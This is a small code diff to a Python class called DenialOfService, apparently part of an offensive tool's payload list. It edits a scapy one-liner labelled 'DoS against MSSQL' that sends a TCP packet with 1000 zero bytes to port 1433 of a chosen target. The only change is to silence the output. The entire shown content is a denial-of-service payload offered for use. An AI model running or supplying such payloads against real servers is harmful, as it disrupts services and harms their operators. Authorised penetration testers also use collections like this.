@@ -25,7 +25,7 @@ class DenialOfService():
         self.payloads.append([
             "DoS against MSSQL",
             "scapy",
-            """sr1(IP(dst="%s")/TCP(dport=1433)/"0"*1000)""" % self._target,
+            """sr1(IP(dst="%s")/TCP(dport=1433)/"0"*1000, verbose=0)""" % self._target,
             ""
         ])
 
